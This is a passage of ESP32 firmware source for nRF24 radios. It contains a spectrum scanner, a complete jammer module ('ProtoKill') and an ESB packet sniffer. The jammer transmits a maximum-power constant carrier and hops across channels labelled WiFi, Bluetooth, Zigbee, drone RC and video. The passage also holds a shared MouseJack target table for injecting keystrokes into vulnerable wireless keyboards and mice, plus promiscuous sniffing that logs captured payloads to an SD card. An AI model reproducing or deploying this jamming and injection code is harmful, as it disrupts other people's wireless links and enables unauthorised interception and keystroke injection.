    }
  }
}

static int scannerValueToBarPx(uint8_t val, uint8_t peakVal) {
  if (val == 0 || !s_plot.valid || s_plot.maxBarHeight <= 0) {
    return 0;
  }

  const int maxH = s_plot.maxBarHeight;
  if (peakVal == 0 || val >= peakVal) {
    return min(maxH, max(kScannerMinBarPx, (int)val));
  }

  const int span = maxH - kScannerMinBarPx;
  int scaled = kScannerMinBarPx + (span * (int)val) / (int)peakVal;
  return min(maxH, max(kScannerMinBarPx, scaled));
}

static void scannerUpdateBars(const uint8_t* vals, int count) {
  if (!s_graphChromeDrawn) {
    scannerDrawGraphChrome();
  }
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  for (int i = 0; i < count; i++) {
    const int newPx = scannerValueToBarPx(vals[i], peakVal);
    const int oldPx = s_prevBarPx[i];
    if (newPx != oldPx) {
      scannerUpdateBarColumn(i, newPx, oldPx);
    }
  }
}

void display() {
  if (!scanning) {
    return;
  }

  uint8_t frameHits[N];
  memset(frameHits, 0, sizeof(frameHits));

  disable();
  static uint32_t lastNavPoll = 0;
  for (int pass = 0; pass < (int)DISPLAY_SWEEPS && scanning; ++pass) {
    for (int i = 0; i < N && scanning; ++i) {
      if ((i % BUTTON_POLL_STRIDE) == 0 && isSelectButtonPressed()) {
        scanning = false;
        Print("Display interrupted by user", UI_WARN, true);
        return;
      }
      if (feature_exit_requested || featureExitButtonPressed()) {
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) {
        frameHits[i]++;
      }

      const uint32_t now = millis();
      if (now - lastNavPoll >= UI_THROTTLE_MS) {
        scannerPollNavButtons();
        lastNavPoll = now;
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }

  scannerSmoothFrame(frameHits, N);
  scannerUpdateBars(s_smoothValues, N);
  scannerUpdatePeakMarker(s_smoothValues, N);
  scannerUpdateStatusPanel(s_smoothValues, N);
}

void scannerSetup() {
  // A touch exit from Replay used to bypass its RMT teardown.  Scanner is a
  // hard SPI ownership boundary, so make it safe even after an abnormal exit.
  SubGhzLifecycle::shutdown(false);
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  // The menu already armed the Radio24 feedback cue. Do not clear it here;
  // scannerUpdateStatusPanel() will take over with live RF activity colours.
  neopixelShowActivityColor(0, 70, 210, true);
  bleSetScannerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  scannerResetGraphState();
  scannerDrawGraphChrome();

  setupTouchscreen();

  scannerDrawTextBoxes();
  scannerDrawStatusLineIfChanged(0, "Peak: scanning...", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(2, "Strength: --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(3, "Active: 0 channel(s)", UI_DIM_TEXT);
  scannerDrawStaticStatusLines();
  Print("[+] Scanner ready", UI_WARN, false);
  redrawTouchButtonBar();

  prepareNrfSharedSpiBus();
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(kNrfSpiHz);
  SPI.setBitOrder(MSBFIRST);

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);

  disable();
  s_radioReady = verifyNrfSharedSpiDevice((uint8_t)CE, (uint8_t)CSN, 3);
  if (!s_radioReady) {
    scannerDrawStatusLineIfChanged(0, "NRF bus unavailable", UI_WARN);
    scannerDrawStatusLineIfChanged(1, "Check SPI / shared pins", UI_WARN);
    scannerDrawStatusLineIfChanged(2, "Scanner safely stopped", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(3, "Active: 0 channel(s)", UI_DIM_TEXT);
    Print("[!] NRF register validation failed", UI_WARN, false);
    scanning = true;
    return;
  }
  scannerResetRadioState();
  Serial.printf("[scanner] clean RX baseline cfg=%02X status=%02X ch=%02X\n",
                (unsigned)getRegister(_NRF24_CONFIG),
                (unsigned)getRegister(_NRF24_STATUS),
                (unsigned)getRegister(_NRF24_RF_CH));

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {

    if (feature_active && (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }

    scannerPollNavButtons();
    runUI();
    if (!s_radioReady) {
      delay(20);
      continue;
    }
    scanChannels();
    outputChannels();
    display();
    delay(2);
  }
}

void exit() {
  // Fully release the nRF24 so it stops holding the shared SPI bus and drawing
  // RX current after the user leaves the feature.
  scanning = false;
  disable();    // CE low: leave RX mode
  if (s_radioReady) powerDown();  // clear PWR_UP only if SPI validated
  digitalWrite(CSN, HIGH);
  s_radioReady = false;

  // Scanner remaps SPI (SCK/MISO swapped vs PN532 on DIV V2).  Repair and
  // release the bus now, but do not block the menu on an SD mount.
  releaseSharedSpiWithoutSdMount();
}

}  // namespace Scanner

namespace ProtoKill {

RF24 radio1(CE_PIN_1, CSN_PIN_1, kNrfSpiHz);
RF24 radio2(CE_PIN_2, CSN_PIN_2, kNrfSpiHz);
RF24 radio3(CE_PIN_3, CSN_PIN_3, kNrfSpiHz);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE, VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE, ZIGBEE_MODULE, NRF24_MODULE };
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;
static bool radio3Active = false;
void updateTFT();

const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[] =              {2, 26, 80};
const byte WiFi_channels[] =             {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[] =               {1, 3, 5, 7};
const byte zigbee_channels[] =           {11, 15, 20, 25};
const byte nrf24_channels[] =            {76, 78, 79};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool modeChangeRequested1 = false;
volatile bool jammerToggleRequested = false;

static constexpr int kProkillLogTop = 48;

static int prokillVisibleLines() {
  return bleMaxLinesInZone(kProkillLogTop, LINE_HEIGHT);
}

static bool prokillLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

static void prokillRedrawLogLine(int bufIndex) {
  const int visibleLines = prokillVisibleLines();
  if (bufIndex < 0 || bufIndex >= visibleLines) {
    return;
  }
  const int yPos = (bufIndex * LINE_HEIGHT) + kProkillLogTop;
  if (!prokillLineFits(yPos)) {
    return;
  }

  tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
  tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
  tft.setCursor(5, yPos);
  tft.print(Buffer[bufIndex]);
}

static void prokillRedrawAllLog() {
  const int visibleLines = prokillVisibleLines();
  for (int i = 0; i < Index && i < visibleLines; i++) {
    prokillRedrawLogLine(i);
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = prokillVisibleLines();
  const bool scrolled = (Index >= visibleLines);
  if (scrolled) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  if (scrolled) {
    prokillRedrawAllLog();
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    prokillRedrawLogLine(i);
  }
}

void prokillHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }

  if (isButtonPressedEdge(BTN_UP)) {
    jammerToggleRequested = true;
    bleWaitButtonRelease(BTN_UP);
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    modeChangeRequested = true;
    bleWaitButtonRelease(BTN_RIGHT);
  }
  if (isButtonPressedEdge(BTN_LEFT)) {
    modeChangeRequested1 = true;
    bleWaitButtonRelease(BTN_LEFT);
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();
  radio.startConstCarrier(RF24_PA_MAX, 45);
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  radio3Active = false;
  nrfApplyActiveRadioSelection();
  prepareNrfSharedSpiBus();

  if (beginNrfRadioReliable(radio1)) {
    radio1Active = true;
  }
  if (beginNrfRadioReliable(radio2)) {
    radio2Active = true;
  }
  if (thirdNrfEnabled() && beginNrfRadioReliable(radio3)) {
    radio3Active = true;
  }
  if (radio1Active) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
  }
  if (radio2Active) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
  }
  if (radio3Active) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
  }
  Serial.printf("[nrf] ProtoKill NRF1=%s NRF2=%s NRF3=%s fixed PA=MAX\n",
                radio1Active ? "OK" : "MISS", radio2Active ? "OK" : "MISS",
                radio3Active ? "OK" : (thirdNrfEnabled() ? "MISS" : "OFF"));
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    if (radio3Active) radio3.powerDown();
    radio3Active = false;
    nrfApplyActiveRadioSelection();
  }
}

void updateTFT() {
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, UI_ICON);

    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);

}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText                  += "Unknown";   break;
  }
  Print(modeText, UI_TEXT, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, UI_WARN, false);
}

void checkModeChange() {
  prokillHandleNavButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (modeChangeRequested1) {
    modeChangeRequested1 = false;
    currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
    initializeRadios();
    updateTFT();
    printModeChange(currentMode);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();
    printJammerStatus(jammerActive);
  }
}

void prokillSetup() {
  pauseBackgroundRadioTasks();
  neopixelClear();
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);
  Index = 0;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  updateTFT();

  initializeRadios();
  setupTouchscreen();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void prokillLoop() {
uint8_t chSel;
  while (1) {
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
      feature_exit_requested = true;
      return;
    }

    maintainTouchNavBar();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    checkModeChange();

    if (jammerActive) {
      if (currentMode == BLE_MODULE) {
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));
        // radio3.setChannel(channel);

      } else if (currentMode == Bluetooth_MODULE) {
        chSel = ble_channels[ random( sizeof(ble_channels)/sizeof(ble_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = ble_channels[ random( sizeof(ble_channels)/sizeof(ble_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == WiFi_MODULE) {
        chSel = WiFi_channels[ random( sizeof(WiFi_channels)/sizeof(WiFi_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = WiFi_channels[ random( sizeof(WiFi_channels)/sizeof(WiFi_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == USB_WIRELESS_MODULE) {
        chSel = usbWireless_channels[ random( sizeof(usbWireless_channels)/sizeof(usbWireless_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = usbWireless_channels[ random( sizeof(usbWireless_channels)/sizeof(usbWireless_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == VIDEO_TX_MODULE) {
        chSel = videoTransmitter_channels[ random( sizeof(videoTransmitter_channels)/sizeof(videoTransmitter_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = videoTransmitter_channels[ random( sizeof(videoTransmitter_channels)/sizeof(videoTransmitter_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == RC_MODULE) {
        chSel = rc_channels[ random( sizeof(rc_channels)/sizeof(rc_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = rc_channels[ random( sizeof(rc_channels)/sizeof(rc_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == ZIGBEE_MODULE) {
        chSel = zigbee_channels[ random( sizeof(zigbee_channels)/sizeof(zigbee_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = zigbee_channels[ random( sizeof(zigbee_channels)/sizeof(zigbee_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));

      } else if (currentMode == NRF24_MODULE) {
        chSel = nrf24_channels[ random( sizeof(nrf24_channels)/sizeof(nrf24_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = nrf24_channels[ random( sizeof(nrf24_channels)/sizeof(nrf24_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));
      }
    }
  }

  // Yield to the scheduler so the idle task/watchdog and core-0 radio stack get
  // CPU time; without this the tight loop starves the system and everything lags.
  delay(1);
}

void exit() {
  // Without this, leaving the feature keeps the radios running
  // startConstCarrier() at the selected PA level: a permanent 2.4 GHz
  // transmission that makes the ESP32's own WiFi/BLE and UI sluggish.
  jammerActive = false;
  modeChangeRequested = false;
  modeChangeRequested1 = false;
  jammerToggleRequested = false;
  radio1.powerDown();
  radio2.powerDown();
  if (radio3Active) radio3.powerDown();
  radio3Active = false;
  nrfApplyActiveRadioSelection();
  releaseSharedSpiWithoutSdMount();
}

}  // namespace ProtoKill

// Shared MouseJack targets: scanner publishes, inject consumes.
static constexpr int kMjSharedMax = 12;
struct MjSharedTarget {
  uint8_t addr[5];
  uint8_t channel = 0;
  bool used = false;
  bool vulnerable = false;
  char vendor[12] = {0};
  uint16_t hits = 0;
};
static MjSharedTarget g_mjShared[kMjSharedMax];

static void mjSharedPublish(const uint8_t* addr, uint8_t ch, bool vulnerable, const char* vendor) {
  int idx = -1;
  for (int i = 0; i < kMjSharedMax; i++) {
    if (g_mjShared[i].used && memcmp(g_mjShared[i].addr, addr, 5) == 0) {
      idx = i;
      break;
    }
  }
  if (idx < 0) {
    for (int i = 0; i < kMjSharedMax; i++) {
      if (!g_mjShared[i].used) {
        idx = i;
        break;
      }
    }
    if (idx < 0) {
      idx = 0;
    }
    memset(&g_mjShared[idx], 0, sizeof(MjSharedTarget));
    memcpy(g_mjShared[idx].addr, addr, 5);
    g_mjShared[idx].used = true;
  }
  g_mjShared[idx].channel = ch;
  g_mjShared[idx].hits++;
  if (vulnerable) {
    g_mjShared[idx].vulnerable = true;
  }
  if (vendor && vendor[0]) {
    strncpy(g_mjShared[idx].vendor, vendor, sizeof(g_mjShared[idx].vendor) - 1);
  }
}

static int mjSharedCount() {
  int n = 0;
  for (int i = 0; i < kMjSharedMax; i++) {
    if (g_mjShared[i].used) {
      n++;
    }
  }
  return n;
}

namespace EsbSniffer {

#define CE  configuredNrfAuxCePin()
#define CSN configuredNrfAuxCsnPin()

#define _ESB_CONFIG     0x00
#define _ESB_EN_AA      0x01
#define _ESB_EN_RXADDR  0x02
#define _ESB_SETUP_AW   0x03
#define _ESB_SETUP_RETR 0x04
#define _ESB_RF_CH      0x05
#define _ESB_RF_SETUP   0x06
#define _ESB_STATUS     0x07
#define _ESB_RX_ADDR_P0 0x0A
#define _ESB_RX_PW_P0   0x11
#define _ESB_FIFO_STATUS 0x17

static constexpr int kEsbPayloadMax = 32;
static constexpr int kEsbMaxLogLines = 16;
static constexpr int kEsbStatusLines = 4;
static constexpr int kEsbLineHeight = 12;
static constexpr int kEsbToolbarBottom = 36;
static constexpr int kEsbToolbarGap = 8;
static constexpr int kEsbStatusY = kEsbToolbarBottom + kEsbToolbarGap;
static constexpr int kEsbBoxHeaderH = 15;
static constexpr int kEsbStatusTextY = kEsbStatusY + kEsbBoxHeaderH;
static constexpr int kEsbStatusBoxH = kEsbBoxHeaderH + (kEsbStatusLines * kEsbLineHeight) + 4;
static constexpr int kEsbLogGap = 4;
static constexpr int kEsbLogBoxTop = kEsbStatusY + kEsbStatusBoxH + kEsbLogGap;
static constexpr int kEsbLogStartY = kEsbLogBoxTop + kEsbBoxHeaderH;
static constexpr int kEsbLogBottomPad = 4;
static constexpr uint32_t kEsbHopIntervalMs = 80;
static constexpr const char* kEsbDir = "/esb";
static constexpr const char* kEsbFilePrefix = "/esb/esb_";

static bool uiDrawn = false;
static volatile bool sniffing = false;
static uint8_t s_channel = 76;
static bool s_hopping = false;
static bool s_logEnabled = true;
static bool s_sdReady = false;
static String s_logPath;
struct PendingEsbPacket {
  uint32_t whenMs;
  uint8_t channel;
  uint8_t length;
  uint8_t payload[kEsbPayloadMax];
};
static constexpr uint8_t kPendingEsbPackets = 32;
static PendingEsbPacket s_pendingPackets[kPendingEsbPackets];
static uint8_t s_pendingPacketCount = 0;
static uint32_t s_pendingPacketDropped = 0;
static uint32_t s_packetTotal = 0;
static uint32_t s_rateCount = 0;
static uint32_t s_rateLastMs = 0;
static uint32_t s_ratePerSec = 0;
static uint32_t s_lastHopMs = 0;
static int s_hopIndex = 0;

static String s_logBuffer[kEsbMaxLogLines];
static uint16_t s_logColor[kEsbMaxLogLines];
static int s_logIndex = 0;

static String s_statusText[kEsbStatusLines];
static uint16_t s_statusColor[kEsbStatusLines];
static int s_statusDrawnW[kEsbStatusLines];

static String s_logDrawn[kEsbMaxLogLines];
static uint16_t s_logDrawnColor[kEsbMaxLogLines];
static int s_logDrawnW[kEsbMaxLogLines];

static bool s_esbLogDirty = false;
static bool s_esbStatusDirty = false;
static uint32_t s_esbLastUiMs = 0;
static constexpr uint32_t kEsbUiMinIntervalMs = 100;

static int esbLogBoxBottom() {
  return bleContentBottom() - kEsbLogBottomPad;
}

static int esbLogBoxH() {
  const int h = esbLogBoxBottom() - kEsbLogBoxTop;
  return h > (kEsbBoxHeaderH + kEsbLineHeight) ? h : (kEsbBoxHeaderH + kEsbLineHeight);
}

static int esbLogEndY() {
  return kEsbLogBoxTop + esbLogBoxH() - 2;
}

static int esbVisibleLogLines() {
  const int avail = esbLogEndY() - kEsbLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / kEsbLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > kEsbMaxLogLines ? kEsbMaxLogLines : n;
}

static const uint8_t kHopChannels[] = {
  2, 5, 10, 26, 40, 50, 60, 70, 76, 78, 79, 80, 83
};
static constexpr int kHopCount = sizeof(kHopChannels) / sizeof(kHopChannels[0]);

static const uint8_t kPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

static byte esbGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void esbSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void esbWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    SPI.transfer(data[i]);
  }
  digitalWrite(CSN, HIGH);
}

static void esbDisable() {
  digitalWrite(CE, LOW);
}

static void esbEnable() {
  digitalWrite(CE, HIGH);
}

static void esbPowerUp() {
  esbSetRegister(_ESB_CONFIG, esbGetRegister(_ESB_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void esbPowerDown() {
  esbSetRegister(_ESB_CONFIG, esbGetRegister(_ESB_CONFIG) & ~0x02);
}

static void esbFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void esbInitRadioSpi() {
#if defined(SD_SCLK) && defined(SD_MISO) && defined(SD_MOSI)
  prepareNrfSharedSpiBus();
#else
  SPI.begin();
#endif
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(kNrfSpiHz);
  SPI.setBitOrder(MSBFIRST);
}

static void esbApplyChannel(uint8_t ch) {
  esbDisable();
  esbSetRegister(_ESB_RF_CH, ch);
  esbFlushRx();
  esbEnable();
  delayMicroseconds(130);
}

static void esbConfigureRadio() {
  esbDisable();
  esbPowerUp();

  esbWriteRegMulti(_ESB_RX_ADDR_P0, kPromiscAddr, 5);
  esbSetRegister(_ESB_EN_AA, 0x00);
  esbSetRegister(_ESB_EN_RXADDR, 0x01);
  esbSetRegister(_ESB_SETUP_AW, 0x03);
  esbSetRegister(_ESB_SETUP_RETR, 0x00);
  esbSetRegister(_ESB_RF_SETUP, 0x0F);
  esbSetRegister(_ESB_RX_PW_P0, kEsbPayloadMax);
  esbSetRegister(_ESB_CONFIG, 0x0B);

  esbApplyChannel(s_channel);
}

static bool esbEnsureDir() {
  if (SD.exists(kEsbDir)) {
    return true;
  }
  if (SD.mkdir(kEsbDir)) {
    return true;
  }
  return SD.mkdir("esb");
}

static bool esbMakeNextPath(String& outPath) {
  char buf[40];
  for (uint16_t i = 0; i < 10000; i++) {
    snprintf(buf, sizeof(buf), "%s%04u.log", kEsbFilePrefix, (unsigned)i);
    if (!SD.exists(buf)) {
      outPath = String(buf);
      return true;
    }
  }
  return false;
}

static bool esbPrepareLogTarget() {
  SdFileIoGuard io(1800);
  if (!io.locked()) return false;
  restoreSdAfterSharedSpi();
  if (!isSDCardAvailable()) return false;
  if (!esbEnsureDir()) {
    return false;
  }
  if (!esbMakeNextPath(s_logPath)) {
    return false;
  }
  return true;
}

static bool esbSdHeapReady(const char* phase) {
  const uint32_t freeHeap = ESP.getFreeHeap();
  const uint32_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  const bool ready = freeHeap >= 30000u && largest >= 12000u;
  if (!ready) {
    Serial.printf("[esb] SD %s deferred: low heap=%u largest=%u\n",
                  phase, (unsigned)freeHeap, (unsigned)largest);
  }
  return ready;
}

static String esbPayloadHex(const uint8_t* payload, int len);

static bool esbFlushPendingPackets() {
  if (!esbSdHeapReady("flush")) return false;
  SdFileIoGuard io(2500);
  if (!io.locked()) return false;
  restoreSdAfterSharedSpi();
  if (!isSDCardAvailable() || !esbEnsureDir()) return false;
  if (s_logPath.isEmpty() && !esbMakeNextPath(s_logPath)) return false;

  File log = SD.open(s_logPath.c_str(), FILE_WRITE);
  if (!log) return false;
  log.println("# ESP32-DIV ESB Sniffer");
  log.println("# format: ms,ch,len,hex");
  for (uint8_t i = 0; i < s_pendingPacketCount; ++i) {
    const PendingEsbPacket& packet = s_pendingPackets[i];
    log.print(packet.whenMs);
    log.print(',');
    log.print(packet.channel);
    log.print(',');
    log.print(packet.length);
    log.print(',');
    log.println(esbPayloadHex(packet.payload, packet.length));
  }
  log.flush();
  const bool ok = log.getWriteError() == 0;
  log.close();
  if (ok) s_pendingPacketCount = 0;
  return ok;
}

static int esbTrimPayloadLen(const uint8_t* payload, int maxLen) {
  int len = maxLen;
  while (len > 1 && payload[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static String esbPayloadHex(const uint8_t* payload, int len) {
  static char hexBuf[3 * kEsbPayloadMax + 1];
  int pos = 0;
  for (int i = 0; i < len && pos < (int)sizeof(hexBuf) - 3; i++) {
    pos += snprintf(hexBuf + pos, sizeof(hexBuf) - pos, "%02X", payload[i]);
  }
  hexBuf[pos] = '\0';
  return String(hexBuf);
}

static String esbChannelGHzText(uint8_t ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return String(buf);
}

static void esbAppendLogLine(const String& text, uint16_t color) {
  const int visible = esbVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) {
    s_logIndex++;
  }
  s_esbLogDirty = true;
}

static constexpr int kEsbStatPadX = 10;
static constexpr int kEsbStatValueX = 70;
static constexpr int kEsbStatTextDy = 2;

static void esbPaintTextLine(int x, int y, int maxW, int lineH,
                             String& cacheText, uint16_t& cacheColor, int& cacheW,
                             const String& text, uint16_t color, bool force) {
  if (!force && cacheText == text && cacheColor == color) {
    return;
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kEsbStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void esbRedrawLog() {
  const int endY = esbLogEndY();
  const int visible = esbVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kEsbLogStartY + i * kEsbLineHeight;
    if (y + kEsbLineHeight > endY) {
      break;
    }
    if (i < s_logIndex) {
      esbPaintTextLine(kEsbStatPadX, y, maxW, kEsbLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       s_logBuffer[i], s_logColor[i], false);
    } else {
      esbPaintTextLine(kEsbStatPadX, y, maxW, kEsbLineHeight,
                       s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                       String(""), UI_DIM_TEXT, false);
    }
  }
  s_esbLogDirty = false;
}

static void esbDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kEsbStatusLines) {
    return;
  }
  const int y = kEsbStatusTextY + line * kEsbLineHeight;
  const int maxW = tft.width() - kEsbStatValueX - 8;
  esbPaintTextLine(kEsbStatValueX, y, maxW, kEsbLineHeight,
                   s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                   text, color, false);
}

